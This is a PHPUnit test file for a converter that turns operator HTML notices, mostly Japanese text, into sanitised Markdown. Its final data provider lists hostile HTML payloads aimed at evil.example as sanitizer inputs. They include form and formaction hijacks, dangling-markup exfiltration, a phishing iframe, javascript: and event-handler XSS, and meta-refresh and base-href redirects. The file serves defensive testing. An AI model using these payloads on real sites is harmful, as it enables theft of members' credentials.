<?php

declare(strict_types=1);

namespace Tests\Unit\Support;

use App\Support\MarkdownText;
use App\Support\OperatorHtmlMarkdown;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * Asserted on what the reader ends up seeing: the converted source is run back through
 * MarkdownText::renderOperator(), the renderer the Classic exits use.
 */
class OperatorHtmlMarkdownTest extends TestCase
{
    public function test_an_empty_value_stays_empty(): void
    {
        $this->assertSame('', OperatorHtmlMarkdown::convert('')->markdown);
        $this->assertSame('', OperatorHtmlMarkdown::convert(" \n ")->markdown);
    }

    public function test_text_without_markup_runs_its_lines_together_as_the_browser_did(): void
    {
        $html = $this->render("1 行目\n2 行目\n\n3 行目");

        $this->assertStringNotContainsString('<br', $html);
        $this->assertStringContainsString('1 行目 2 行目 3 行目', $html);
    }

    public function test_markdown_punctuation_in_text_without_markup_stays_literal(): void
    {
        $html = $this->render('# 見出しではない *注意* _強調_ [括弧] &amp; 記号');

        $this->assertStringNotContainsString('<h1>', $html);
        $this->assertStringNotContainsString('<em>', $html);
        $this->assertStringContainsString('# 見出しではない *注意* _強調_ [括弧] &amp; 記号', $html);
    }

    public function test_a_newline_between_text_lines_is_not_a_line_break_but_br_is(): void
    {
        $html = $this->render("<p>上の行\n続き<br>\n次の行</p>");

        $this->assertSame(1, substr_count($html, '<br'));
        $this->assertStringContainsString('上の行 続き<br', $html);
    }

    public function test_coloured_spans_keep_their_text_and_emphasis_and_report_the_style(): void
    {
        $converted = OperatorHtmlMarkdown::convert('<p><span style="color: #ff0000;"><strong>重要なお知らせ</strong></span><span style="color: #0000ff;">本文</span></p>');
        $html = MarkdownText::renderOperator($converted->markdown)->toHtml();

        $this->assertStringContainsString('<strong>重要なお知らせ</strong>本文', $html);
        $this->assertStringNotContainsString('style', $html);
        $this->assertSame(['style' => 2], $converted->droppedAttributes);
        $this->assertSame([], $converted->droppedElements);
        $this->assertTrue($converted->isLossy());
    }

    public function test_font_tags_misnested_across_bold_keep_their_text(): void
    {
        $html = $this->render('<font size="2" color="#000000"><b>見出し<a href="https://example.com/a">こちら</a>です</b></font><br><b>太字</font></b><br>末尾');

        $this->assertStringContainsString('<strong>見出し<a href="https://example.com/a"', $html);
        $this->assertStringContainsString('<strong>太字</strong>', $html);
        $this->assertStringContainsString('末尾', $html);
        $this->assertStringNotContainsString('font', $html);
    }

    public function test_a_stray_closing_br_is_the_line_break_a_browser_made_of_it(): void
    {
        $html = $this->render('1 行目</br>2 行目</br></br>3 行目');

        $this->assertStringContainsString('1 行目<br', $html);
        $this->assertStringContainsString('3 行目', $html);
        $this->assertSame(2, substr_count($html, '<p>'));
    }

    public function test_a_linked_image_stays_a_linked_image_and_loses_its_size(): void
    {
        $converted = OperatorHtmlMarkdown::convert('<a href="https://example.com/shop" target="_blank" rel="nofollow"><img src="https://example.com/b.png" alt="バナー" width="300" height="250" border="0"></a>');
        $html = MarkdownText::renderOperator($converted->markdown)->toHtml();

        $this->assertMatchesRegularExpression('~<a href="https://example\.com/shop"[^>]*><img src="https://example\.com/b\.png" alt="バナー"~', $html);
        $this->assertStringNotContainsString('width', $html);
        $this->assertSame(['border' => 1, 'height' => 1, 'rel' => 1, 'target' => 1, 'width' => 1], $converted->droppedAttributes);
    }

    public function test_a_site_path_link_stays_in_place(): void
    {
        $html = $this->render('<p>規約は<a href="/default/privacyPolicy" target="_blank">こちら</a></p>');

        $this->assertStringContainsString('<a href="/default/privacyPolicy">こちら</a>', $html);
    }

    public function test_a_boxed_notice_keeps_its_structure_without_ids_and_classes(): void
    {
        $converted = OperatorHtmlMarkdown::convert(<<<'HTML'
            <div class="mbo" style="margin: 0 0 10px 0"><div style="padding:10px;color:#333;background:#ffc;border:solid 1px #cc0"><div style="position:relative;font-weight:bold">お知らせ</div>
            <p><span class="aka">赤い注意書き</span>つづき</p>
            <p style="padding:5px 0 0"><a href="/info"><b>詳しくはこちら</b></a></p>
            <hr style="border-top:1px solid #ccc">
            <h5>見出し</h5>
            </div></div>
            HTML);
        $html = MarkdownText::renderOperator($converted->markdown)->toHtml();

        $this->assertStringContainsString('<p>お知らせ</p>', $html);
        $this->assertStringContainsString('<p>赤い注意書きつづき</p>', $html);
        $this->assertStringContainsString('<a href="/info"><strong>詳しくはこちら</strong></a>', $html);
        $this->assertStringContainsString('<hr', $html);
        $this->assertStringContainsString('<h5>見出し</h5>', $html);
        $this->assertSame(['class' => 2, 'style' => 5], $converted->droppedAttributes);
    }

    public function test_markdown_punctuation_in_bare_text_and_in_a_div_stays_literal(): void
    {
        $html = $this->render('- 箇条書きではない<br>&gt; 引用ではない<div>*強調ではない* 1. 番号ではない</div>');

        $this->assertStringNotContainsString('<ul>', $html);
        $this->assertStringNotContainsString('<ol>', $html);
        $this->assertStringNotContainsString('<blockquote>', $html);
        $this->assertStringNotContainsString('<em>', $html);
        $this->assertStringContainsString('- 箇条書きではない', $html);
        $this->assertStringContainsString('*強調ではない*', $html);
    }

    public function test_scripts_frames_styles_and_head_tags_are_removed_and_reported(): void
    {
        $converted = OperatorHtmlMarkdown::convert(<<<'HTML'
            <!-- tag manager -->
            <script>window.dataLayer = []; alert('<p>not text</p>');</script>
            <noscript><iframe src="https://example.com/ns.html" height="0" width="0" style="display:none"></iframe></noscript>
            <style>#Header { display: none }</style>
            <meta name="robots" content="noindex"><link rel="stylesheet" href="https://example.com/x.css">
            <iframe src="https://www.youtube.com/embed/x" width="470" height="264" frameborder="0"></iframe>
            <a href="/about">運営者情報</a>
            HTML);

        $this->assertSame('[運営者情報](/about)', $converted->markdown);
        $this->assertSame(['iframe' => 1, 'link' => 1, 'meta' => 1, 'noscript' => 1, 'script' => 1, 'style' => 1], $converted->droppedElements);
    }

    public function test_a_value_that_is_only_script_converts_to_nothing(): void
    {
        $converted = OperatorHtmlMarkdown::convert('<script src="https://example.com/a.js" async></script>');

        $this->assertSame('', $converted->markdown);
        $this->assertSame(['script' => 1], $converted->droppedElements);
    }

    public function test_a_link_without_an_href_keeps_only_its_text(): void
    {
        $html = $this->render('<p><a herf="https://example.com/">誤記のリンク</a></p>');

        $this->assertStringContainsString('<p>誤記のリンク</p>', $html);
    }

    /** The routes operator HTML used to reach a member's credentials without running script. */
    #[DataProvider('takeoverMarkup')]
    public function test_markup_that_hijacks_the_page_does_not_survive(string $source): void
    {
        $html = $this->render($source);

        $this->assertDoesNotMatchRegularExpression('~<(?!/?(?:p|br|a|strong|em|img|hr|h[1-6]|ul|ol|li|blockquote|code|pre|del|span)\b)[a-z]~i', $html);
        $this->assertDoesNotMatchRegularExpression('~\s(?:on[a-z]+|style|id|name|class|data-[a-z-]+|action|formaction|srcdoc)\s*=~i', str_replace('class="sr-only" data-new-tab-notice=', '', $html));
        $this->assertStringNotContainsString('javascript:', $html);
    }

    /** @return array<string, array{string}> */
    public static function takeoverMarkup(): array
    {
        return [
            'unclosed form swallowing the login form' => ['<form action="https://evil.example/collect" method="get"><input name="x"><p>ようこそ</p>'],
            'element a first-party script reads its URL from' => ['<div data-notifications-url="https://evil.example/n" id="notificationCenter" data-passkey-options-url="https://evil.example/p">通知</div>'],
            'unclosed attribute carrying the page out' => ["<p>お知らせ</p><img src='https://evil.example/?"],
            'frame over the login form' => ['<iframe src="https://evil.example/login" style="position:fixed;inset:0"></iframe><p>x</p>'],
            'event handler and script URL' => ['<a href="javascript:alert(1)" onclick="alert(1)">押す</a><img src="x" onerror="alert(1)"><svg onload="alert(1)"></svg>'],
            'meta refresh' => ['<meta http-equiv="refresh" content="0;url=https://evil.example/"><b>x</b>'],
            'base href' => ['<base href="https://evil.example/"><a href="/login">ログイン</a>'],
            'input with a form attribute' => ['<input form="login" name="password" value="x"><button form="login" formaction="https://evil.example/">送信</button>'],
        ];
    }

    private function render(string $operatorHtml): string
    {
        return MarkdownText::renderOperator(OperatorHtmlMarkdown::convert($operatorHtml)->markdown)->toHtml();
    }
}
